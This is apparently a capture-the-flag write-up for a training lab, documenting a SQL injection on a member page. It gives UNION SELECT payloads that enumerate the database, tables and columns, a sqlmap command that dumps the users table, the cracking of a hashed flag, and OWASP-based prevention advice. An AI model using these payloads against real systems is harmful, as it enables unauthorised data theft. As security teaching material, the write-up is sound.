[README.md](../../../README.md)
# SQL Injection Member page
Page: http://10.13.200.53/?page=member

WAPITI SCAN reveal this error:
```
Vulnerability found in /index.php
Description HTTP Request cURL command line
Blind SQL vulnerability via injection in the parameter id
GET /index.php?page=member&id=sleep%287%29%231&Submit=Submit HTTP/1.1
Host: 10.13.200.53
Referer: http://10.13.200.53/index.php?page=member
curl "http://10.13.200.53/index.php?page=member&id=sleep%287%29%231&Submit=Submit" -e "http://10.13.200.53/index.php?page=member"
```
Cybersecurity piscine script also

## SQL
Basic SQL injection test:

`1 == 1`

**Result**: `You have an error sin your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '= 1' at line 1`

`1 UNION SELECT 1,2`
**Result**: 
```
ID: 1 UNION SELECT 1,2 
First name: one
Surname : me
ID: 1 UNION SELECT 1,2 
First name: 1
Surname : 2
```

**Database name:**
```
ID: 0 UNION SELECT 1,database()
First name: 1
Surname : Member_Sql_Injection
```

**Database version:**
```
ID: 1 UNION SELECT 1,@@version 
First name: 1
Surname : 5.5.64-MariaDB-1ubuntu0.14.04.1
```

**Table name:**
`0 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES `

RESULTS:
 - CHARACTER_SETS
...
 - db_default
 - users
 - guestbook
 - list_images
 - vote_dbs

 **Column names:**
 - CHARACTER_SET_NAME
...
 - username
 - password
 - user_id
 - first_name
 - last_name
 - town
 - country
 - planet
 - Commentaire
 - countersign
 - id_comment
 - url
 - title
 - id_vote
 - vote
 - nb_vote
 - subject

**We can use the concat() method to see extra fields:**
`0 UNION select 1,concat(town) from users`

For the user with the id 5: 
    last_name = "GetThe", 
    first_name = 'falg' ,
    town = '42', 
    country = '42', 
    planet = '42', 
    Commentaire= "Decrypt this password -> then lower all the char. Sh256 on it and it's good!",
    countersign = '5ff9d0165b4f92b14994e5c685cdce28'


using this website: [Hash Function (+Salt) Decrypter - Unhash Password - Online Decoder](https://www.dcode.fr/hash-function)
The decrypted hash md5 give: *FortyTwo*

If we encrypt `fortytwo` with SHA256 we have: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Sqlmap tool
`sqlmap -u "http://192.168.2.128/?page=member&id=1&Submit=Submit#" --dump -T users`

```
Database: Member_Sql_Injection
Table: users
[4 entries]
+-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| user_id | town     | planet | country  | last_name | first_name | Commentaire                               | countersign                      |
+-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| 1       | Paris    | EARTH  | France   | me        | one        | Je pense, donc je suis                               | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2       | Helsinki | Earth  | Finlande | me        | two        | Aamu on iltaa viisaampi.                               | 60e9032c586fb422e2c16dee6286cf10 |
| 3       | Dublin   | Earth  | Irlande  | me        | three      | Dublin is a city of stories and ecrets.                                      | e083b24a01c483437bcf4a9eea7c1b4d |
| 5       | 42       | 42     | 42       | GetThe    | Flag       | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
+-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
```

## Prevention 
-> [SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
### Client Side (JQUERY)
- Input sanitization, before sending any data to the server
- Use input masks to restrict user input to specific formats.

### Server side (PHP)
- Use ORM
- Input validation and sanitization with php functions like:
    - `filter_var()`
    - `htmlspecialchars()`

---

Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!

Do not create dynamic SQL queries using simple string concatenation.

Escape all data received from the client.

Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.

Apply the principle of least privilege by using the least privileged database user possible.

In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.

Grant the minimum database access that is necessary for the application.